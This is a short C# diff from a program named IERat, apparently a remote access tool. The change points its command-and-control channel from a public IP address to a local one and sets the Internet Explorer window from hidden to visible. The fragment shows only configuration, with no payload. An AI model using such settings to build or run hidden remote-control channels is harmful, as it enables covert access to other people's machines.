@@ -5,9 +5,9 @@ namespace IERat
     class IERat
     {
         public static Channel channel = new Channel { 
-            BaseURL = "http://3.68.73.27:443",
+            BaseURL = "http://192.168.135.1:1337",
             SleepTime = 3000,
-            IEvisible = false
+            IEvisible = true
         };
 
         static void Main()
